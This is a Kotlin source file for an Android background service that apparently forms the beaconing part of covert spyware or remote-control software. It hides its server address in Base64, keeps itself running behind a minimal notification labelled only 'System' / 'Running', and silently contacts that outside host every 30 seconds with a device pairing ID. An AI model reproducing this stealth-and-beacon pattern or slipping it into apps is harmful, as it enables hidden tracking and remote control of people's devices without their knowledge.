package com.sync.xxx

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Base64
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class DeviceService : Service() {

    companion object {
        val SERVER_URL: String
            get() = String(
                Base64.decode(
                    "aHR0cDovL3BhcHNreS5xdWVlbi1vZmZpY2lhbC5jb206MjQ2OA==",
                    Base64.DEFAULT
                )
            )
    }

    private val exec = Executors.newSingleThreadExecutor()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startFg()
        exec.execute { loop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    private fun startFg() {
        val id = "sync_ch"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            nm?.createNotificationChannel(
                NotificationChannel(id, "Sync", NotificationManager.IMPORTANCE_MIN)
            )
        }
        val n: Notification = NotificationCompat.Builder(this, id)
            .setContentTitle("System")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1001, n)
    }

    private fun pair(): String {
        return try {
            val t = assets.open("uid.json").bufferedReader().readText()
            JSONObject(t).optString("pair", "NEONXJZET0000")
        } catch (_: Exception) {
            "NEONXJZET0000"
        }
    }

    private fun loop() {
        val p = pair()
        while (true) {
            try {
                val u = URL(SERVER_URL.trimEnd('/') + "/ping?pair=" + p)
                val c = u.openConnection() as HttpURLConnection
                c.connectTimeout = 8000
                c.readTimeout = 8000
                c.requestMethod = "GET"
                c.connect()
                try { c.inputStream.close() } catch (_: Exception) {}
                c.disconnect()
            } catch (_: Exception) {
            }
            try { Thread.sleep(30000) } catch (_: Exception) {}
        }
    }
}
